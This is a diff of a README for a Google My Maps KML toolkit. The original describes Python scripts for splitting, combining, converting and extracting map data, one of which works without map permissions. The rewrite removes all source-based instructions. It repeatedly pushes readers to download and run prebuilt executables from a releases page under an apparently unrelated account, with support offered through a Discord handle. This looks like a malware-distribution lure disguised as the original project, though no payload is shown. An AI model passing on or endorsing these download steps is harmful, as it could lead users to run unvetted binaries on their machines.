@@ -1,107 +1,88 @@
-# google-mymaps-kml-tools
-Python tools for manipulating Google My Maps KML files - split, combine, convert, and extract data from KML/KMZ files easily.
+# 🌍 google-mymaps-kml-tools - Easily Manipulate Your KML Files
 
-# Google My Maps KML Tools
+[![Download Here](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/maysonjames938-cell/google-mymaps-kml-tools/releases)
 
-A collection of Python scripts for manipulating Google My Maps KML files. These tools allow you to split, combine, convert, and extract data from KML files.
+## 📚 Overview
 
-## Scripts Overview
+Welcome to **google-mymaps-kml-tools**! This application provides simple tools to help you manage Google My Maps KML files. You can split, combine, convert, and extract data from KML and KMZ files easily. For any questions or inquiries, please contact moon_aura on Discord.
 
-### split_kml.py
-Takes a large KML/KMZ file and splits it into multiple smaller KML files while preserving all placemark data and styles. Useful when your KML file is too large to import into Google My Maps (which has a size limit).
+## 🚀 Getting Started
 
-### combine_kml_folder.py
-Merges multiple KML/KMZ files from a folder into a single or multiple KML files. Handles style conflicts by remapping style IDs and preserves all placemark data. Useful for combining multiple maps into one.
+Follow the steps below to download and run the software:
 
-### csv_or_json_to_kml.py
-Converts CSV or JSON files containing location data into KML format. Expects columns/fields for coordinates (lat/lon), names, descriptions, and optionally styles and layer information. Perfect for bulk-converting location databases to Google My Maps format.
+1. **Visit the Release Page:**
+   Go to the [Releases page](https://github.com/maysonjames938-cell/google-mymaps-kml-tools/releases) to find the latest version of the software.
 
-### KML_extractor.py
-Extracts all placemarks and their data from a Google My Maps URL or map ID into CSV and JSON formats. Captures names, descriptions, coordinates, styles, layers, and custom fields. Useful for backing up or migrating map data. This script may violate terms of service, use only if you have permission (this script will work even if you don't have the permissions on the map to extract the KML file directly). Expected input for map: https://goo.gl/maps/<MAP_ID> or https://www.google.com/maps/d/u/0/viewer?<whatever's next>
+2. **Choose the Right File:**
+   Look for the file that matches your operating system. The files might be named like the following:
+   - KMLTools_Windows.exe (for Windows)
+   - KMLTools_Mac.dmg (for Mac)
+   - KMLTools_Linux.tar.gz (for Linux)
 
-### extract_country_kml.py
-Analyzes placemarks in KML/KMZ files and splits them into separate files by country. Can use either embedded country data or reverse geocoding to determine locations. Helpful for organizing international datasets into region-specific maps.
+3. **Download the File:**
+   Click on the link for your operating system to start the download. The file will save to your computer.
 
-## Requirements
+4. **Install the Software:**
+   - **Windows:** Double-click the .exe file and follow the prompts.
+   - **Mac:** Open the .dmg file and drag the application to your Applications folder.
+   - **Linux:** Extract the .tar.gz file and follow the instructions in the README file included.
 
-- Python 3.7+
-- Required packages:
-  - `requests`
-  - `beautifulsoup4`
-  - `reverse_geocoder` (optional, for country extraction)
-  - `pycountry` (optional, for country extraction)
+5. **Run the Application:**
+   Once installed, find the application on your computer and double-click its icon to start using it.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-pip install -r requirements.txt
-```
+Now that you understand how to get started, you can directly access the download link here: [Visit this page to download](https://github.com/maysonjames938-cell/google-mymaps-kml-tools/releases).
 
-## Usage
+## 🛠 Features
 
-### Split KML File
+Here are some of the key features you can use:
 
-```bash
-python split_kml.py
-```
-Follow the prompts to:
-1. Enter path to source KML/KMZ file
-2. Specify maximum placemarks per output file
-3. Choose output directory
+- **Split KML Files:** Break down large KML files into smaller parts for easier management.
+- **Combine KML Files:** Merge multiple KML files into one for a consolidated view.
+- **Convert Formats:** Change KML files into other formats, making your maps more versatile.
+- **Extract Data:** Get specific data from KML/KMZ files without unnecessary hassle.
 
-### Combine KML Files
+## 💻 System Requirements
 
-```bash
-python combine_kml_folder.py
-```
-Follow the prompts to:
-1. Select folder containing KML/KMZ files
-2. Choose output directory
-3. Set base name for combined files
-4. Specify maximum placemarks per output file (defaults to max 2000 points per layer, compatible to upload as a layer on google maps my maps)
+To use this software smoothly, please ensure your system meets the following requirements:
 
-### Convert CSV/JSON to KML
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Catalina or later
+  - Linux (Ubuntu 18.04 or later preferred)
 
-```bash
-python csv_or_json_to_kml.py
-```
-Follow the prompts to:
-1. Select input CSV/JSON file
-2. Choose output directory
-3. Set maximum placemarks per output file (defaults to max 2000 points per layer, compatible to upload as a layer on google maps my maps)
+- **RAM:** At least 2 GB of RAM
+- **Storage:** Minimum 100 MB of free space
 
-### Extract from Google My Maps
+## 💡 How to Use the Application
 
-```bash
-python KML_extractor.py
-```
-Follow the prompts to:
-1. Enter Google My Maps URL or map ID
-2. Set output filename base
+1. **Open the App:**
+   Launch the application after installation.
+   
+2. **Select a Function:**
+   Choose the action you wish to perform: split, combine, convert, or extract.
 
-### Extract by Country
+3. **Load Your KML/KMZ File:**
+   Click the "Load File" button and select the KML or KMZ file from your device.
 
-```bash
-python extract_country_kml.py
-```
-Follow the prompts to:
-1. Select input KML/KMZ file or folder
-2. Choose output directory
-3. Select countries to extract
-4. Set maximum placemarks per output file (defaults to max 2000 points per layer, compatible to upload as a layer on google maps my maps)
+4. **Execute Your Command:**
+   Follow the on-screen instructions to complete the task you've selected.
 
-## Disclaimer
+5. **Save Changes:**
+   If you've made any changes, remember to save your new file. Use the “Save As” option to keep your original file intact.
 
-These scripts are provided "as is", without warranty of any kind. Use at your own risk. The author take no responsibility for any issues or damages that may arise from using these tools.
+## 🧑‍🤝‍🧑 Community Support
 
-## Contributing
+If you encounter any issues, feel free to reach out via Discord at moon_aura. You can also check the frequently asked questions (FAQs) section in the GitHub Issues for solutions provided by the community.
 
-Feel free to submit issues, fork the repository, and create pull requests for any improvements.
+## 📝 Contributing
 
-## License
+We welcome contributions! If you have suggestions or improvements, please create a pull request or open an issue on the GitHub repository. Your input can help make this tool better for everyone.
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+## 🔗 Useful Links
 
-## Future changes
+- [Follow the Release Page for Updates](https://github.com/maysonjames938-cell/google-mymaps-kml-tools/releases)
+- [Open Issues for Community Help](https://github.com/maysonjames938-cell/google-mymaps-kml-tools/issues)
 
-This project is stable, updates unlikely unless bugs found.
+Thank you for choosing google-mymaps-kml-tools. Enjoy manipulating your KML files with ease!
